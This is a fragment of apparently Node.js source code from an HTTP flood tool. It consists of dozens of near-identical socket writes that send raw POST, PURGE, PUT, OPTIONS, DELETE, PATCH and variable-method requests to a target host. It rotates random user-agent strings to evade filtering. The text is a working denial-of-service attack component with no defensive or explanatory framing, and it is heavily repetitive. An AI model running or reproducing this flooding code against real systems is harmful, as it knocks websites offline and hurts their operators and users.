		s.write('POST ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + nullHexs[Math.floor(Math.random() * nullHexs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'); 
		s.write('PURGE ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'); 
		s.write('PUT ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
		s.write('OPTIONS ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + nullHexs[Math.floor(Math.random() * nullHexs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'); 
		s.write('DELETE ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'); 
		s.write('PATCH ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
        s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
        s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
        s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
        s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
